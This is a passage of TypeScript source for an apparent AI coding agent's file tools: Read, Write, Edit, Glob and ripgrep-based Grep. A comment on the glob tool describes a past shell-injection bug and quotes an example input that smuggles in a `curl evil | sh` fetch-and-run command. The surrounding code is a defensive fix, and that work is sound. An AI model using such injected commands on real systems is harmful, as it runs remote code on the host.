      return {
        content: output || ToolPrompts.bashExitCodeResult(proc.exitCode),
        is_error: true,
        _truncCtx: { totalBytes, totalLines },
      }
    }
    return { content: output, _truncCtx: { totalBytes, totalLines } }
  } catch (e) {
    return {
      content: ToolPrompts.bashErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}

/**
 * Read a file with cat -n style line numbers : OR, when the file is an image
 * and the active model accepts image input, hand the pixels back as a real
 * image content block on the `tool_result` (auto-shrunk to fit the wire cap).
 *
 * Text output format: `<line_number>\t<line_content>` per line, matching the
 * real CLI's Read tool so the model can cite line numbers in later Edit calls.
 *
 * Media behavior (only when `opts.media` is supplied : a multimodal host):
 * - recognized image the model accepts →
 *   `{ content: "<caption>", blocks: [image] }`,
 *   resized first if it would blow the per-item byte cap. This is
 *   what makes "Read the screenshot" actually work instead of decoding PNG
 *   bytes as UTF-8 mojibake.
 * - recognized media the model/limits reject → an honest, actionable message.
 * - everything else (source, logs, JSON, unknown bytes) → the text path below,
 *   byte-identical to the pre-multimodal behavior. The decision is
 *   content-addressed (magic bytes), so a `.png` that actually holds text is
 *   still read as text.
 *
 * @param input - Tool input:
 *   - `file_path` - Absolute path to read
 *   - `offset` - Zero-based line offset to start at (default: 0)
 *   - `limit` - Max number of lines to read (default: all)
 */
async function execRead(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  if (opts.signal?.aborted) return ABORTED_RESULT()
  const requestedPath = input.file_path as string
  const offset = (input.offset as number) ?? 0
  const limit = input.limit as number | undefined

  // Self-heal a whitespace-confusable path (e.g. macOS screenshots whose name
  // carries a NARROW NO-BREAK SPACE that got normalized to a plain space).
  const filePath = resolveWhitespaceConfusablePath(requestedPath) ?? requestedPath
  const healedNote = filePath !== requestedPath ? ToolPrompts.whitespaceResolvedNote(filePath) : ""

  // Size guard (B-045): both branches below slurp the whole file via
  // readFileSync, which OOMs on a multi-GB file. Check the on-disk size BEFORE
  // either read. On stat failure (e.g. missing file) skip the guard and let the
  // existing readFileSync catch produce the normal "Read error" message.
  try {
    const st = statSync(filePath)
    if (st.size > MAX_READ_BYTES) {
      return {
        content:
          healedNote + ToolPrompts.readTooLargeResult((st.size / 1024 / 1024).toFixed(1), 50),
        is_error: true,
      }
    }
  } catch {
    // Stat failed; fall through so the read path emits the canonical error.
  }

  // Media-aware branch. Read the raw bytes ONCE, let the (pure, provider-
  // neutral) policy decide image-vs-text-vs-reject, and reuse the decoded
  // bytes for the text path so there is no double read. Only engaged when the
  // host threaded a media context (a multimodal model); otherwise we skip
  // straight to the text path so text-only hosts and existing tests are
  // unaffected.
  if (opts.media) {
    let bytes: Uint8Array
    try {
      bytes = await Bun.file(filePath).bytes()
    } catch (e) {
      return {
        content: ToolPrompts.readErrorResult(e instanceof Error ? e.message : String(e)),
        is_error: true,
      }
    }
    const decision = await decideReadFile(bytes, opts.media)
    if (decision.kind === "image") {
      return { content: healedNote + decision.summary, blocks: [decision.block] }
    }
    if (decision.kind === "rejected") {
      // Informational, not a hard error: a clear message + next step beats
      // is_error:true (which nudges the model to pointlessly retry Read).
      return { content: healedNote + decision.message }
    }
    // decision.kind === "text": fall through, decoding the bytes we already
    // hold instead of re-reading from disk.
    return renderTextRead(new TextDecoder().decode(bytes), offset, limit, healedNote)
  }

  try {
    const content = await Bun.file(filePath).text()
    return renderTextRead(content, offset, limit, healedNote)
  } catch (e) {
    return {
      content: ToolPrompts.readErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}

/**
 * Render the cat -n text body for a fully-read file. Extracted so the
 * media-aware and text-only branches of {@link execRead} share one
 * implementation (and the offset/limit/_truncCtx contract stays in one place).
 */
function renderTextRead(
  content: string,
  offset: number,
  limit: number | undefined,
  healedNote: string,
): ToolExecResult {
  const allLines = content.split("\n")
  const start = offset
  const end = limit ? start + limit : allLines.length
  const slice = allLines.slice(start, end)

  // Return with line numbers (cat -n style)
  const numbered = slice.map((line, i) => `${start + i + 1}\t${line}`).join("\n")
  return {
    content: healedNote + numbered,
    _truncCtx: {
      totalBytes: Buffer.byteLength(content, "utf8"),
      totalLines: allLines.length,
      startLine: start,
    },
  }
}

/**
 * Write content to a file, overwriting any existing content. Creates parent
 * directories as needed (matching the real CLI's Write tool behavior).
 *
 * @param input - Tool input:
 *   - `file_path` - Absolute path to write
 *   - `content` - Full file content
 */
async function execWrite(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  if (opts.signal?.aborted) return ABORTED_RESULT()
  const filePath = input.file_path as string
  const content = input.content as string

  try {
    // Ensure parent directory exists
    mkdirSync(dirname(filePath), { recursive: true })

    const file = Bun.file(filePath)
    const before = (await file.exists()) ? await file.text() : ""
    await Bun.write(filePath, content)
    const isNew = before === ""
    const patch = isNew
      ? buildFileDiff(filePath, "", content)
      : buildFileDiff(filePath, before, content)
    const display = patch
      ? renderUnifiedDiff(patch, isNew ? `New file: ${filePath}` : `Write: ${filePath}`)
      : undefined
    return {
      content: ToolPrompts.fileWrittenResult(filePath),
      display,
      ...(patch ? { _displayPatch: patch, _displayNewFile: isNew } : {}),
    }
  } catch (e) {
    return {
      content: ToolPrompts.writeErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}

/**
 * Replace exact text in a file.
 *
 * **Uniqueness check**: if `replace_all` is false, the `old_string` must
 * match exactly once. Multiple matches return an error so the model is
 * forced to provide more context (matching the real CLI's safety behavior).
 *
 * @param input - Tool input:
 *   - `file_path` - Absolute path to modify
 *   - `old_string` - Exact text to find
 *   - `new_string` - Replacement text
 *   - `replace_all` - If true, replace all matches (default: false)
 */
async function execEdit(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  if (opts.signal?.aborted) return ABORTED_RESULT()
  const requestedPath = input.file_path as string
  const oldString = input.old_string as string
  const newString = input.new_string as string
  const replaceAll = (input.replace_all as boolean) ?? false

  // Self-heal a whitespace-confusable path (see resolveWhitespaceConfusablePath).
  const filePath = resolveWhitespaceConfusablePath(requestedPath) ?? requestedPath

  try {
    let content = await Bun.file(filePath).text()
    const count = content.split(oldString).length - 1

    if (count === 0) {
      return {
        content: ToolPrompts.editOldStringNotFoundResult(filePath),
        is_error: true,
      }
    }

    if (!replaceAll && count > 1) {
      return {
        content: ToolPrompts.editOldStringMultipleMatchesResult(count, filePath),
        is_error: true,
      }
    }

    const before = content
    if (replaceAll) {
      content = content.split(oldString).join(newString)
    } else {
      content = content.replace(oldString, newString)
    }

    await Bun.write(filePath, content)
    const patch = buildEditDiff(filePath, before, oldString, newString, replaceAll)
    const display = patch ? renderUnifiedDiff(patch) : undefined
    return {
      content: ToolPrompts.fileEditedResult(filePath, replaceAll ? count : 1),
      display,
      ...(patch ? { _displayPatch: patch } : {}),
    }
  } catch (e) {
    return {
      content: ToolPrompts.editErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}

/**
 * Find files matching a glob pattern, in-process via {@link Bun.Glob}.
 *
 * Output is limited to 100 entries to avoid context bloat. Patterns like
 * `**\/*.ts` (recursive globstar) and `*.json` (single-level) both work.
 *
 * Security: the `pattern` is model-controlled, so it is matched in-process and
 * NEVER handed to a shell. (The previous implementation interpolated `pattern`
 * unquoted into a `bash -c` string, which allowed arbitrary command execution,
 * e.g. `pattern="*.ts; curl evil | sh"`.) Bun.Glob evaluates the pattern as a
 * glob only — there is no shell to inject into.
 *
 * @param input - Tool input:
 *   - `pattern` - Glob pattern (e.g. `**\/*.ts`, `src/*.{js,ts}`)
 *   - `glob_pattern` - Alias for `pattern` (Cursor-compatible)
 *   - `path` - Directory to search in (default: current bash cwd)
 *   - `target_directory` - Alias for `path` (Cursor-compatible)
 */
async function execGlob(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  if (opts.signal?.aborted) return ABORTED_RESULT()
  const resolved = resolveGlobExecArgs(input, bashCwd)
  if (!resolved.ok) return { content: resolved.error, is_error: true }
  const { pattern, searchPath } = resolved

  try {
    // Match in-process so the model-controlled pattern is never shell-evaluated.
    // `onlyFiles:false` keeps directories (parity with `ls -1d`); `dot:false`
    // mirrors bash glob's default of not matching leading-dot names; entries
    // are returned relative to `cwd`. Bun.Glob handles `**` globstar.
    const glob = new Bun.Glob(pattern)
    const entries: string[] = []
    for await (const entry of glob.scan({
      cwd: searchPath,
      onlyFiles: false,
      dot: false,
    })) {
      if (opts.signal?.aborted) return ABORTED_RESULT()
      entries.push(entry)
      if (entries.length >= 100) break
    }

    if (entries.length === 0) {
      return { content: ToolPrompts.noFilesMatchedResult() }
    }
    // Sort for a stable, `ls`-like ordering of the relative paths.
    entries.sort()
    const output = entries.join("\n")
    const totalBytes = Buffer.byteLength(output, "utf8")
    const totalLines = entries.length
    return { content: output, _truncCtx: { totalBytes, totalLines } }
  } catch (e) {
    return {
      content: ToolPrompts.globErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}

/**
 * Hard ceiling on Grep stdout+stderr buffered in memory. Aligned with the
 * Bash drain ceiling so a single mega-line match (minified bundle) cannot
 * buffer multi-MB before the universal clamp. Enforced during the async
 * drain so a pathological match set can't OOM the agent while still
 * yielding to the event loop so the TUI live area keeps painting.
 */
export const MAX_GREP_OUTPUT_BYTES = 512 * 1024

/** Wall-clock limit for a single `rg` invocation (ms). */
const GREP_TIMEOUT_MS = 30_000

/**
 * Search file contents using ripgrep (`rg`).
 *
 * Three output modes (matches the real CLI's Grep tool):
 * - `files_with_matches` (default): list paths only
 * - `count`: count matches per file
 * - `content`: show matching lines with optional context (-A/-B/-C)
 *
 * Results are head-limited (default 250 lines) with a "... N more lines"
 * marker to keep responses bounded. Pass `head_limit: 0` for unlimited.
 *
 * **Async spawn (critical for TUI responsiveness):** previously this used
 * `child_process.spawnSync`, which blocked the entire JS event loop for the
 * duration of `rg`. That froze the live-area prompt input, spinner, and
 * keystroke handling. We now use `Bun.spawn` with native `signal` +
 * `timeout` so the event loop keeps running; abort (Esc) kills `rg` via
 * Bun's AbortSignal integration.
 *
 * Recognized `input` fields:
 *
 * - `pattern` - Regex pattern to search for
 * - `path` - File or directory to search (default: bash cwd)
 * - `glob` - Glob filter (e.g. `*.ts`)
 * - `output_mode` - `content` | `files_with_matches` | `count`
 * - `-i` - Case insensitive
 * - `-A` - Lines after match (content mode only)
 * - `-B` - Lines before match (content mode only)
 * - `-C` - Context lines (content mode only)
 * - `head_limit` - Cap output lines (default: 250, 0 = unlimited)
 * - `multiline` - Allow `.` to match newlines
 */
async function execGrep(
  input: Record<string, unknown>,
  opts: ToolExecOpts,
): Promise<ToolExecResult> {
  if (opts.signal?.aborted) return ABORTED_RESULT()
  const pattern = input.pattern as string
  const searchPath = (input.path as string) ?? bashCwd
  const outputMode = (input.output_mode as string) ?? "files_with_matches"
  const caseInsensitive = input["-i"] as boolean
  const headLimit = (input.head_limit as number) ?? 250
  const glob = input.glob as string | undefined
  const contextA = input["-A"] as number | undefined
  const contextB = input["-B"] as number | undefined
  const contextC = (input["-C"] ?? input.context) as number | undefined
  const multiline = input.multiline as boolean

  const args = ["--no-heading", "--color=never"]

  if (outputMode === "files_with_matches") args.push("-l")
  else if (outputMode === "count") args.push("-c")
  else args.push("-n") // content mode, show line numbers

  if (caseInsensitive) args.push("-i")
  if (multiline) args.push("-U", "--multiline-dotall")
  if (glob) args.push("--glob", glob)
  if (contextA != null) args.push("-A", String(contextA))
  if (contextB != null) args.push("-B", String(contextB))
  if (contextC != null) args.push("-C", String(contextC))

  args.push("--", pattern, searchPath)

  try {
    // Async spawn: free the event loop so the live-area prompt/spinner keep
    // updating while ripgrep runs. Bun's native `signal` aborts the child on
    // Esc; `timeout` is the 30s wall-clock ceiling (was spawnSync.timeout).
    const proc = Bun.spawn(["rg", ...args], {
      stdout: "pipe",
      stderr: "pipe",
      stdin: "ignore",
      signal: opts.signal,
      timeout: GREP_TIMEOUT_MS,
      killSignal: "SIGTERM",
    })

    let outputBytes = 0
    let outputCapped = false
    const drain = async (stream: ReadableStream<Uint8Array>): Promise<string> => {
      const decoder = new TextDecoder()
      let acc = ""
      const reader = stream.getReader()
      try {
        while (true) {
          const { done, value } = await reader.read()
          if (done) break
          // Keep draining after the cap so pipes close, but stop growing `acc`.
          if (outputCapped) continue
          outputBytes += value.byteLength
          acc += decoder.decode(value, { stream: true })
          if (outputBytes > MAX_GREP_OUTPUT_BYTES) {
            outputCapped = true
            try {
              proc.kill("SIGTERM")
            } catch {
              /* already exited */
            }
          }
        }
      } finally {
        reader.releaseLock()
      }
      if (!outputCapped) {
        const tail = decoder.decode()
        if (tail) acc += tail
      }
      return acc
    }

    const [stdout, stderr] = await Promise.all([drain(proc.stdout), drain(proc.stderr)])
    const exitCode = await proc.exited

    // Abort wins over every other outcome (timeout, cap, rg error).
    if (opts.signal?.aborted) return ABORTED_RESULT()

    const raw = stdout.trim()

    // Output-cap kill (we SIGTERM'd ourselves) still returns whatever we
    // buffered — same spirit as the old maxBuffer path, which handed back
    // partial stdout rather than hard-failing.
    if (outputCapped && raw) {
      const allLines = raw.split("\n")
      const totalBytes = Buffer.byteLength(raw, "utf8")
      const totalLines = allLines.length
      const limited =
        headLimit > 0 && allLines.length > headLimit ? allLines.slice(0, headLimit).join("\n") : raw
      return {
        content: limited,
        _truncCtx: { totalBytes, totalLines },
      }
    }

    // Timed out: Bun killed the child via `timeout` (SIGTERM/killSignal).
    // Clean rg exits are 0 (matches) / 1 (no match) / 2 (error) and leave
    // signalCode null; a signalled death that isn't our cap-kill is a timeout.
    if (proc.signalCode != null && exitCode !== 0 && exitCode !== 1 && exitCode !== 2) {
      return {
        content: ToolPrompts.grepErrorResult(`rg timed out after ${GREP_TIMEOUT_MS}ms`),
        is_error: true,
      }
    }

    // rg exit codes: 0 = matches, 1 = no matches, 2 = error (bad pattern, IO).
    if (exitCode === 1) {
      return { content: ToolPrompts.noMatchesFoundResult() }
    }
    if (exitCode === 2 || (exitCode !== 0 && exitCode !== 1)) {
      const err = (stderr || stdout).trim()
      return {
        content: ToolPrompts.grepErrorResult(err || `rg exited with code ${exitCode}`),
        is_error: true,
      }
    }

    if (!raw) {
      return { content: ToolPrompts.noMatchesFoundResult() }
    }
    const allLines = raw.split("\n")
    const totalBytes = Buffer.byteLength(raw, "utf8")
    const totalLines = allLines.length
    const limited =
      headLimit > 0 && allLines.length > headLimit ? allLines.slice(0, headLimit).join("\n") : raw
    return {
      content: limited,
      _truncCtx: { totalBytes, totalLines },
    }
  } catch (e) {
    if (opts.signal?.aborted) return ABORTED_RESULT()
    return {
      content: ToolPrompts.grepErrorResult(e instanceof Error ? e.message : String(e)),
      is_error: true,
    }
  }
}
